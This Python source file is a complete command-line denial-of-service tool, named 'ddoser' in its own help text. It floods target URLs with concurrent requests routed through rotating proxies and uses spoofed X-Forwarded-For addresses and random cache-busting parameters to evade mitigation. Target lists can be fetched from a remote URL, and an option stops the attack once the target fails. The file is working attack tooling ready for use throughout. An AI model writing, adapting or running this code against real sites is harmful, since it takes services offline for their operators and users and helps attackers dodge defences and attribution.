#!/usr/bin/env python
import asyncio
import json
import multiprocessing
from http import HTTPStatus

import uvloop
import logging
import os
from collections import defaultdict
from itertools import cycle
from random import randint
from typing import Iterable, List, Tuple, Dict
import urllib.parse as urlparse
from urllib.parse import urlencode


import aiohttp
import click
import requests as requests
from aiohttp_socks import ProxyConnector

from commons import config_logger, set_limits, load_proxies

STATS = defaultdict(int)
URL_ERRORS_COUNT = defaultdict(int)


async def make_request(url: str, proxy: str, timeout: int, headers: Dict[str, str]):
    timeout = aiohttp.ClientTimeout(total=timeout)
    logging.debug('Url: %s Proxy: %s header: %s', url, proxy, headers)
    try:
        if proxy:
            connector = ProxyConnector.from_url(proxy)
            client_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
        else:
            client_session = aiohttp.ClientSession(timeout=timeout)
        client_session.headers.update(headers)

        async with client_session as session:
            async with session.get(url, ssl=False) as response:
                await response.text()
                if response.status >= HTTPStatus.INTERNAL_SERVER_ERROR:
                    URL_ERRORS_COUNT[url] += 1
                logging.info('Url: %s Proxy: %s Status: %s', url, proxy, response.status)

    except Exception as error:
        logging.warning('Url: %s Proxy: %s Error: %s', url, proxy, error)
        STATS[f'{type(error)}'] += 1
        URL_ERRORS_COUNT[url] += 1
    else:
        STATS['success'] += 1


def get_proxy(proxy_iterator: Iterable[str]) -> str:
    try:
        type_, ip, port = next(proxy_iterator)
        return f'{type_}://{ip}:{port}'
    except StopIteration:
        return None


def prepare_url(url: str, with_random_get_param: bool):
    if with_random_get_param:
        url_parts = list(urlparse.urlparse(url))
        query = dict(urlparse.parse_qsl(url_parts[4]))
        query.update({f'param_{randint(0, 1000)}': str(randint(0, 100000))})
        url_parts[4] = urlencode(query)
        return urlparse.urlunparse(url_parts)
    return url


def make_headers(user_agent: str, random_xff_ip: bool, custom_headers: str) -> Dict[str, str]:
    headers = {}
    if user_agent:
        headers['user-agent'] = user_agent
    if random_xff_ip:
        headers['x-forwarded-for'] = f'{randint(10, 250)}.{randint(0, 255)}.{randint(00, 254)}.{randint(1, 250)}'
    if custom_headers:
        try:
            custom_headers_dict = json.loads(custom_headers)
        except ValueError:
            logging.error('Custom header not applied - incorrect json')
        else:
            headers.update(custom_headers_dict)
    return headers


async def ddos(
        target_url: str, timeout: int, count: int, proxy_iterator: Iterable[Tuple[str, str, int]],
        with_random_get_param: bool, user_agent: str, random_xff_ip: bool, custom_headers: str, stop_attack: int
):
    step = 0
    while True:
        if count and step > count:
            break
        if stop_attack and URL_ERRORS_COUNT[target_url] > stop_attack:
            break
        step += 1
        proxy = get_proxy(proxy_iterator)
        headers = make_headers(user_agent, random_xff_ip, custom_headers)
        await make_request(prepare_url(target_url, with_random_get_param), proxy, timeout, headers)



async def amain(
        target_urls: List[str], timeout: int, concurrency: int, count: int, proxies: List[Tuple[str, str, int]],
        with_random_get_param: bool, user_agent: str, random_xff_ip: bool, custom_headers: str, stop_attack: int
):
    coroutines = []
    proxy_iterator = cycle(proxies or [])
    for target_url in target_urls:
        for _ in range(concurrency):
            coroutines.append(
                ddos(target_url, timeout, count, proxy_iterator, with_random_get_param, user_agent, random_xff_ip,
                     custom_headers, stop_attack)
            )
    await asyncio.gather(*coroutines)


def load_targets(target_urls_file: str) -> List[str]:
    target_urls = []
    if target_urls_file:
        if os.path.isfile(target_urls_file):
            with open(target_urls_file) as f:
                target_urls.extend(line.strip() for line in f)
        else:
            try:
                res = requests.get(target_urls_file)
                target_urls.extend(line.strip() for line in res.text.split())
            except:
                pass
    logging.info('Loaded %s targets to ddos', len(target_urls))
    return target_urls


def process(
        target_url: str, target_urls_file: str, proxy_url: str, proxy_file: str,
        concurrency: int, count: int, timeout: int, with_random_get_param: bool,
        user_agent: str, verbose: bool, log_to_stdout: bool, random_xff_ip: bool,
        custom_headers: str, stop_attack: int
):
    config_logger(verbose, log_to_stdout)
    uvloop.install()
    set_limits()
    proxies = load_proxies(proxy_file, proxy_url)
    target_urls = load_targets(target_urls_file)
    if target_url:
        target_urls.append(target_url)
    loop = asyncio.get_event_loop()
    loop.run_until_complete(
        amain(target_urls, timeout, concurrency, count, proxies, with_random_get_param, user_agent, random_xff_ip,
              custom_headers, stop_attack)
    )
    for key, value in STATS.items():
        if key != 'success':
            logging.info("%s: %s", key, value)
    logging.info('success: %s', STATS["success"])


@click.command(help="Run ddoser")
@click.option('--target-url', help='ddos target url')
@click.option('--target-urls-file', help='path or url to file contains urls to ddos')
@click.option('--proxy-url', help='url to proxy resourse')
@click.option('--proxy-file', help='path to file with proxy list')
@click.option('--concurrency', help='concurrency level', type=int, default=1)
@click.option('--count', help='requests count (0 for infinite)', type=int, default=1)
@click.option('--timeout', help='requests timeout', type=int, default=5)
@click.option('--verbose', help='Show verbose log', is_flag=True, default=False)
@click.option('--with-random-get-param', help='add random get argument to prevent cache usage', is_flag=True, default=False)
@click.option('--user-agent', help='custom user agent')
@click.option('--log-to-stdout', help='log to console', is_flag=True)
@click.option('--restart-period', help='period in seconds to restart application (reload proxies ans targets)', type=int)
@click.option('--random-xff-ip', help='set random ip address value for X-Forwarder-For header', is_flag=True, default=False)
@click.option('--custom-headers', help='set custom headers as json', default='{}', type=str)
@click.option('--stop-attack', help='stop attack when target down', type=int, default=0)
def main(
        target_url: str, target_urls_file: str, proxy_url: str, proxy_file: str,
        concurrency: int, count: int, timeout: int, verbose: bool, with_random_get_param: bool,
        user_agent: str, log_to_stdout: str, restart_period: int, random_xff_ip: bool, custom_headers: str,
        stop_attack: int
):
    config_logger(verbose, log_to_stdout)
    if not target_urls_file and not target_url:
        raise SystemExit('--target-url or --target-urls-file is required')
    while True:
        proc = multiprocessing.Process(
            target=process,
            args=(target_url, target_urls_file, proxy_url, proxy_file,
                  concurrency, count, timeout, with_random_get_param,
                  user_agent, verbose, log_to_stdout, random_xff_ip, custom_headers,
                  stop_attack)
        )
        proc.start()
        proc.join(restart_period)
        if proc.exitcode is None:
            logging.info('Killing the process by restart period')
            proc.kill()
            proc.join()
        if restart_period is None:
            break


if __name__ == '__main__':
    main()
